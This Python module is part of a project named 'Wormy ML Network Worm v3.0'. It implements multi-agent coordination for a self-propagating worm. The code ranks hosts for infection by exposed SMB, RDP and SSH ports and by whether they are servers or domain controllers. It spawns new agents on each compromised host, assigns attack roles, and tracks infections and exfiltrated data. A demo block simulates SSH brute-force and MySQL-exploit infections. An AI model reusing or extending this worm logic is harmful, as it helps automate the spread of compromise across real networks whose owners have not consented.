"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Enhanced Multi-Agent Swarm Intelligence
Improved coordination, communication, and emergent behaviors
"""


import json
import os
import sys
import threading
import time
import uuid
from collections import defaultdict
from datetime import datetime
from typing import Dict, List, Set, Tuple

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger


class EnhancedSwarmAgent:
    """
    Enhanced swarm agent with improved capabilities
    """

    def __init__(self, agent_id: str = None, role: str = "worker"):
        self.agent_id = agent_id or str(uuid.uuid4())
        self.role = role  # worker, coordinator, scout, attacker
        self.discovered_hosts = set()
        self.infected_hosts = set()
        self.failed_hosts = set()
        self.shared_knowledge = {}
        self.neighbors = set()
        self.capabilities = set()
        self.health = 100
        self.experience = 0
        self.specialization = None

        # Performance metrics
        self.metrics = {
            "scans_performed": 0,
            "exploits_attempted": 0,
            "successful_infections": 0,
            "failed_infections": 0,
            "data_exfiltrated_mb": 0,
            "uptime_seconds": 0,
            "commands_executed": 0,
        }

        self.start_time = time.time()

        logger.info(f"Enhanced swarm agent initialized: {self.agent_id[:8]} (role: {role})")

    def discover_host(self, host_ip: str, host_info: Dict):
        """Add discovered host with detailed information"""
        self.discovered_hosts.add(host_ip)
        self.shared_knowledge[host_ip] = {
            **host_info,
            "discovered_by": self.agent_id,
            "discovered_at": datetime.now().isoformat(),
            "priority": self._calculate_priority(host_info),
        }
        self.metrics["scans_performed"] += 1
        logger.debug(f"Agent {self.agent_id[:8]} discovered: {host_ip}")

    def _calculate_priority(self, host_info: Dict) -> int:
        """Calculate target priority based on host information"""
        priority = 0

        # More open ports = higher priority
        priority += len(host_info.get("open_ports", [])) * 10

        # Server = higher priority
        if host_info.get("is_server"):
            priority += 50

        # Specific services = higher priority
        valuable_ports = {445: 30, 3389: 25, 22: 20, 80: 15, 443: 15}
        for port in host_info.get("open_ports", []):
            priority += valuable_ports.get(port, 5)

        return priority

    def report_infection(self, host_ip: str, infection_details: Dict = None):
        """Report successful infection with details"""
        self.infected_hosts.add(host_ip)
        self.metrics["successful_infections"] += 1
        self.experience += 10

        if infection_details:
            self.shared_knowledge[host_ip].update(
                {
                    "infected": True,
                    "infection_details": infection_details,
                    "infected_by": self.agent_id,
                    "infected_at": datetime.now().isoformat(),
                }
            )

        logger.success(f"Agent {self.agent_id[:8]} infected: {host_ip}")

    def report_failure(self, host_ip: str, reason: str = None):
        """Report failed infection attempt"""
        self.failed_hosts.add(host_ip)
        self.metrics["failed_infections"] += 1

        if host_ip in self.shared_knowledge:
            self.shared_knowledge[host_ip]["failed_attempts"] = (
                self.shared_knowledge[host_ip].get("failed_attempts", 0) + 1
            )
            if reason:
                self.shared_knowledge[host_ip]["failure_reason"] = reason

        logger.warning(f"Agent {self.agent_id[:8]} failed to infect: {host_ip}")

    def add_neighbor(self, neighbor_id: str):
        """Add neighboring agent"""
        self.neighbors.add(neighbor_id)
        logger.debug(f"Agent {self.agent_id[:8]} connected to {neighbor_id[:8]}")

    def add_capability(self, capability: str):
        """Add capability to agent"""
        self.capabilities.add(capability)
        logger.debug(f"Agent {self.agent_id[:8]} gained capability: {capability}")

    def specialize(self, specialization: str):
        """Specialize agent for specific tasks"""
        self.specialization = specialization
        logger.info(f"Agent {self.agent_id[:8]} specialized as: {specialization}")

    def get_targets(self) -> Set[str]:
        """Get potential targets (discovered but not infected/failed)"""
        return self.discovered_hosts - self.infected_hosts - self.failed_hosts

    def update_health(self, delta: int):
        """Update agent health"""
        self.health = max(0, min(100, self.health + delta))
        if self.health == 0:
            logger.warning(f"Agent {self.agent_id[:8]} health critical!")

    def get_performance_score(self) -> float:
        """Calculate agent performance score"""
        if self.metrics["exploits_attempted"] == 0:
            return 0.0

        success_rate = self.metrics["successful_infections"] / self.metrics["exploits_attempted"]
        efficiency = self.metrics["successful_infections"] / max(self.metrics["scans_performed"], 1)

        return (success_rate * 0.6 + efficiency * 0.4) * 100


class EnhancedSwarmCoordinator:
    """
    Enhanced swarm coordinator with advanced coordination
    """

    def __init__(self):
        self.agents = {}  # agent_id -> EnhancedSwarmAgent
        self.global_knowledge = defaultdict(dict)
        self.infection_graph = defaultdict(set)
        self.task_queue = []
        self.completed_tasks = []
        self.lock = threading.Lock()
        self.communication_log = []

        # Swarm-level metrics
        self.swarm_metrics = {
            "total_scans": 0,
            "total_infections": 0,
            "total_failures": 0,
            "networks_discovered": set(),
            "high_value_targets": [],
        }

        logger.info("Enhanced swarm coordinator initialized")

    def register_agent(self, agent: EnhancedSwarmAgent):
        """Register new agent in swarm"""
        with self.lock:
            self.agents[agent.agent_id] = agent
            self._assign_role(agent)
            logger.info(f"Agent registered: {agent.agent_id[:8]} (total: {len(self.agents)})")

    def _assign_role(self, agent: EnhancedSwarmAgent):
        """Intelligently assign role to agent"""
        # Count current roles
        role_counts = defaultdict(int)
        for a in self.agents.values():
            role_counts[a.role] += 1

        # Assign role based on needs
        if role_counts["coordinator"] == 0:
            agent.role = "coordinator"
        elif role_counts["scout"] < len(self.agents) * 0.2:  # 20% scouts
            agent.role = "scout"
        elif role_counts["attacker"] < len(self.agents) * 0.5:  # 50% attackers
            agent.role = "attacker"
        else:
            agent.role = "worker"

        logger.info(f"Agent {agent.agent_id[:8]} assigned role: {agent.role}")

    def share_knowledge(self, agent_id: str, knowledge: Dict):
        """Share knowledge between agents with conflict resolution"""
        with self.lock:
            for host_ip, host_info in knowledge.items():
                # Merge knowledge intelligently
                if host_ip not in self.global_knowledge:
                    self.global_knowledge[host_ip] = host_info
                else:
                    # Update with newer/better information
                    existing = self.global_knowledge[host_ip]

                    # Prefer infected status
                    if host_info.get("infected"):
                        existing["infected"] = True
                        existing["infection_details"] = host_info.get("infection_details")

                    # Merge open ports
                    existing_ports = set(existing.get("open_ports", []))
                    new_ports = set(host_info.get("open_ports", []))
                    existing["open_ports"] = list(existing_ports | new_ports)

                    # Update priority if higher
                    if host_info.get("priority", 0) > existing.get("priority", 0):
                        existing["priority"] = host_info["priority"]

                    self.global_knowledge[host_ip] = existing

            # Update swarm metrics
            self.swarm_metrics["total_scans"] += len(knowledge)

            logger.debug(f"Knowledge shared by {agent_id[:8]}: {len(knowledge)} hosts")

    def assign_targets(self, agent_id: str, count: int = 5) -> List[Dict]:
        """Assign targets to agent using advanced swarm intelligence"""
        with self.lock:
            agent = self.agents.get(agent_id)
            if not agent:
                return []

            # Get all known hosts
            all_hosts = set(self.global_knowledge.keys())

            # Get all infected hosts (from all agents)
            all_infected = set()
            all_failed = set()
            for a in self.agents.values():
                all_infected.update(a.infected_hosts)
                all_failed.update(a.failed_hosts)

            # Get potential targets
            potential_targets = all_hosts - all_infected

            # Remove hosts that failed too many times
            potential_targets = {
                host
                for host in potential_targets
                if self.global_knowledge[host].get("failed_attempts", 0) < 3
            }

            # Prioritize targets based on agent role
            prioritized = self._prioritize_targets_by_role(agent, potential_targets)

            # Assign top N targets
            assigned = prioritized[:count]

            logger.info(f"Assigned {len(assigned)} targets to agent {agent_id[:8]}")
            return assigned

    def _prioritize_targets_by_role(
        self, agent: EnhancedSwarmAgent, targets: Set[str]
    ) -> List[Dict]:
        """Prioritize targets based on agent role and capabilities"""
        scored_targets = []

        for target in targets:
            target_info = self.global_knowledge.get(target, {})
            score = target_info.get("priority", 0)

            # Role-based scoring
            if agent.role == "scout":
                # Scouts prefer unexplored networks
                score += 20 if target_info.get("newly_discovered") else 0

            elif agent.role == "attacker":
                # Attackers prefer high-value targets
                score += 50 if target_info.get("is_server") else 0
                score += len(target_info.get("open_ports", [])) * 5

            elif agent.role == "coordinator":
                # Coordinators prefer strategic targets
                score += 30 if target_info.get("is_domain_controller") else 0

            # Network proximity (same subnet = higher score)
            if agent.infected_hosts:
                agent_subnet = list(agent.infected_hosts)[0].rsplit(".", 1)[0]
                target_subnet = target.rsplit(".", 1)[0]
                if agent_subnet == target_subnet:
                    score += 15

            scored_targets.append((score, target, target_info))

        # Sort by score (descending)
        scored_targets.sort(reverse=True, key=lambda x: x[0])

        return [{"ip": target, **info} for score, target, info in scored_targets]

    def spawn_new_agent(self, parent_id: str, infected_host: str) -> EnhancedSwarmAgent:
        """Spawn new agent with inherited knowledge"""
        # Create new agent
        new_agent = EnhancedSwarmAgent(role="worker")
        new_agent.infected_hosts.add(infected_host)

        # Inherit knowledge from parent
        parent = self.agents.get(parent_id)
        if parent:
            new_agent.shared_knowledge = parent.shared_knowledge.copy()
            new_agent.add_neighbor(parent_id)
            parent.add_neighbor(new_agent.agent_id)

            # Inherit some capabilities
            for capability in list(parent.capabilities)[:3]:  # Top 3 capabilities
                new_agent.add_capability(capability)

        # Register new agent
        self.register_agent(new_agent)

        # Update infection graph
        self.infection_graph[parent_id].add(infected_host)

        logger.success(f"Spawned new agent {new_agent.agent_id[:8]} on {infected_host}")
        return new_agent

    def get_swarm_statistics(self) -> Dict:
        """Get comprehensive swarm statistics"""
        with self.lock:
            total_infected = set()
            total_discovered = set()
            total_failed = set()

            for agent in self.agents.values():
                total_infected.update(agent.infected_hosts)
                total_discovered.update(agent.discovered_hosts)
                total_failed.update(agent.failed_hosts)

            # Calculate performance metrics
            avg_performance = sum(a.get_performance_score() for a in self.agents.values()) / max(
                len(self.agents), 1
            )

            return {
                "total_agents": len(self.agents),
                "total_infected": len(total_infected),
                "total_discovered": len(total_discovered),
                "total_failed": len(total_failed),
                "infection_rate": (
                    len(total_infected) / len(total_discovered) if total_discovered else 0
                ),
                "avg_infections_per_agent": (
                    len(total_infected) / len(self.agents) if self.agents else 0
                ),
                "avg_performance_score": avg_performance,
                "role_distribution": self._get_role_distribution(),
                "network_coverage": len(self.swarm_metrics["networks_discovered"]),
            }

    def _get_role_distribution(self) -> Dict:
        """Get distribution of agent roles"""
        distribution = defaultdict(int)
        for agent in self.agents.values():
            distribution[agent.role] += 1
        return dict(distribution)

    def coordinate_attack(self, target: str) -> List[str]:
        """Coordinate multi-agent attack on target"""
        with self.lock:
            # Select best agents for attack
            attackers = [
                a
                for a in self.agents.values()
                if a.role in ["attacker", "coordinator"] and a.health > 50
            ]

            # Sort by performance
            attackers.sort(key=lambda a: a.get_performance_score(), reverse=True)

            # Select top 3 attackers
            selected = attackers[:3]

            logger.info(f"Coordinating attack on {target} with {len(selected)} agents")
            return [a.agent_id for a in selected]


if __name__ == "__main__":
    # Test enhanced swarm
    coordinator = EnhancedSwarmCoordinator()

    print("=" * 60)
    print("ENHANCED MULTI-AGENT SWARM TEST")
    print("=" * 60)

    # Create agents
    agent1 = EnhancedSwarmAgent(role="coordinator")
    agent2 = EnhancedSwarmAgent(role="scout")
    agent3 = EnhancedSwarmAgent(role="attacker")

    coordinator.register_agent(agent1)
    coordinator.register_agent(agent2)
    coordinator.register_agent(agent3)

    # Simulate discoveries
    agent1.discover_host("192.168.1.100", {"open_ports": [22, 80], "is_server": True})
    agent2.discover_host("192.168.1.101", {"open_ports": [445, 3389], "is_server": False})
    agent3.discover_host("192.168.1.102", {"open_ports": [3306], "is_server": True})

    # Share knowledge
    coordinator.share_knowledge(agent1.agent_id, agent1.shared_knowledge)
    coordinator.share_knowledge(agent2.agent_id, agent2.shared_knowledge)
    coordinator.share_knowledge(agent3.agent_id, agent3.shared_knowledge)

    # Simulate infections
    agent1.report_infection("192.168.1.100", {"method": "ssh_bruteforce"})
    agent3.report_infection("192.168.1.102", {"method": "mysql_exploit"})

    # Spawn new agent
    agent4 = coordinator.spawn_new_agent(agent1.agent_id, "192.168.1.100")

    # Get statistics
    stats = coordinator.get_swarm_statistics()

    print(f"\nSwarm Statistics:")
    print(f"  Total Agents: {stats['total_agents']}")
    print(f"  Total Infected: {stats['total_infected']}")
    print(f"  Total Discovered: {stats['total_discovered']}")
    print(f"  Infection Rate: {stats['infection_rate']:.1%}")
    print(f"  Avg Performance: {stats['avg_performance_score']:.1f}")
    print(f"  Role Distribution: {stats['role_distribution']}")

    # Coordinate attack
    attackers = coordinator.coordinate_attack("192.168.1.101")
    print(f"\nCoordinated Attack:")
    print(f"  Attackers: {len(attackers)}")

    print("=" * 60)
